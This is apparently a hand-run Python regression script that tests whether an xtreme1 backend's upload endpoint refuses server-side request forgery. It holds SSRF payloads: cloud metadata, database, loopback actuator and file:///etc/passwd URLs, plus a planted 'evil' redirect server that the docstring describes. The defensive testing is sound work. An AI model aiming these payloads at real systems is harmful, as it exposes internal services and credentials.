"""Reproduce the SSRF attacks /data/upload is supposed to refuse, against a running stack.

Unit tests and the smoke gate both went green on a version of this guard that did not hold:
the checks ran, and then hutool's downloader followed a redirect none of them had seen. The
only thing that caught it was standing up a server that answers one thing to the check and
another to the download. This is that server, kept.

Not run by the PR gate: it needs two stacks configured differently and a server planted on
the compose network, which the gate has no way to arrange. Run it by hand before changing
UploadUrlValidator or the download in UploadDataUseCase.

Needs the stack reachable at X1_BASE and a container named `evil` on the same compose network
serving evil_redirector.py, which is beside this file:

  docker run -d --name evil --network <stack>_default -v "$PWD/.github/ci-verify:/x"       python:3.11-slim python /x/evil_redirector.py

Two runs, because the halves need opposite configuration -- see X1_REDIRECT_CASE below.
Both must exit 0:

  X1_REDIRECT_CASE=0 python attack_ssrf.py   # stack started with defaults
  X1_REDIRECT_CASE=1 python attack_ssrf.py   # stack started with allowPrivateNetwork=true

Negative control, run 2026-09-22 against the released basicai/xtreme1-backend:v0.9.2 image:
seven of these eight assertions fail. The redirect one reports status=DOWNLOAD_COMPLETED --
the unpatched download follows the 302 and fetches the metadata endpoint.
"""
import json
import os
import subprocess
import sys
import time
import uuid

import requests

BASE = os.environ.get("X1_BASE", "http://localhost:8190")
API = BASE + "/api"

s = requests.Session()
s.trust_env = False
failures = []
checked = 0


def call(method, path, **kw):
    r = s.request(method, API + path, timeout=180, **kw)
    r.raise_for_status()
    body = r.json()
    if isinstance(body, dict) and body.get("code") not in (None, "OK"):
        raise RuntimeError(f"{path}: {body.get('code')} {body.get('message')}")
    return body.get("data") if isinstance(body, dict) and "data" in body else body


def check(name, ok, detail=""):
    global checked
    checked += 1
    print(f"{'PASS' if ok else 'FAIL'} {name}{(' — ' + detail) if detail else ''}", flush=True)
    if not ok:
        failures.append(name)


def upload(dataset_id, file_url, timeout=90):
    serial = call("POST", "/data/upload", json={
        "fileUrl": file_url, "datasetId": dataset_id, "source": "URL", "dataFormat": "XTREME1"})
    end = time.time() + timeout
    rec = None
    while time.time() < end:
        recs = call("GET", "/data/findUploadRecordBySerialNumbers", params={"serialNumbers": str(serial)})
        rec = recs[0] if recs else None
        if rec and rec.get("status") in ("PARSE_COMPLETED", "FAILED"):
            return rec
        time.sleep(2)
    return rec



user = f"atk_{uuid.uuid4().hex[:8]}@example.com"
s.headers["Authorization"] = "Bearer " + call(
    "POST", "/user/register", json={"username": user, "password": "Atk123456789"})["token"]
ds = call("POST", "/dataset/create", json={"name": f"atk-{uuid.uuid4().hex[:6]}", "type": "IMAGE"})["id"]

REDIRECT_CASE = os.environ.get("X1_REDIRECT_CASE", "1") == "1"

# The redirect case needs the evil server reachable, and on a laptop the only place to put it
# is the compose network -- a private address the guard refuses at hop 0 by default. So it runs
# against a stack started with upload.url.allowPrivateNetwork=true, which switches off the
# address rule and leaves the redirect as the only thing under test. The internal-target cases
# below need the opposite. Two runs cover both; one run covers neither on its own.
if REDIRECT_CASE:
    print("--- the redirect the checks never see ---", flush=True)
    # evil answers 200 to both probes (validateUrl and redirectTarget), so resolve() hands this URL
    # to the download; only the download gets 302 into the metadata service.
    subprocess.run(["docker", "restart", "evil"], capture_output=True)
    time.sleep(3)
    rec = upload(ds, "http://evil:9999/payload.zip")
    msg = (rec or {}).get("errorMessage") or ""
    check("download refuses a redirect the probes did not see",
          rec is not None and rec.get("status") == "FAILED" and "illegal" in msg.lower(),
          f"status={(rec or {}).get('status')} message={msg!r}")

INTERNAL_TARGETS = [
    ("cloud metadata service", "http://169.254.169.254/latest/meta-data/"),
    ("the database", "http://mysql:3306/"),
    ("MinIO's console port", "http://minio:9001/"),
    ("loopback inside the container", "http://127.0.0.1:8080/actuator/env"),
    ("a private LAN address", "http://192.168.1.10/dataset.zip"),
    ("a non-http scheme", "file:///etc/passwd"),
]

# Only meaningful with the address rule on, so this half belongs to the other run. Asserting
# it here would fail against a stack deliberately told to allow private addresses.
if not REDIRECT_CASE:
    print("\n--- targets inside the backend's own network ---", flush=True)
    for label, url in INTERNAL_TARGETS:
        rec = upload(ds, url, timeout=60)
        msg = (rec or {}).get("errorMessage") or ""
        check(f"refuses {label}",
              rec is not None and rec.get("status") == "FAILED" and "illegal" in msg.lower(),
              f"status={(rec or {}).get('status')} message={msg!r}")

assert checked, "no assertion ran -- wrong mode?"
print("\nFAILURES:", failures)
sys.exit(1 if failures else 0)
